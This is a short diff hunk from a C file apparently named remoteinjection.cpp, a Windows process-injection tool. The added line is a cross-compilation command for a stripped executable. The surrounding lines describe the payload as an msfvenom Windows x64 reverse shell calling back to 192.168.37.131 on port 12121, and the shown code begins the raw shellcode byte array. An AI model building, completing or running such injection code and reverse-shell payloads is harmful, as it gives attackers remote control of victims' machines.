@@ -4,6 +4,7 @@
 #include <string.h>
 #include <stdio.h>
 
+// Compilation : x86_64-w64-mingw32-gcc remoteinjection.cpp -o remote.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -libstdc++ -static-libgcc
 // our payload: reverse shell (msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.37.131 LPORT=12121 -f c )
 unsigned char payload[] =
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
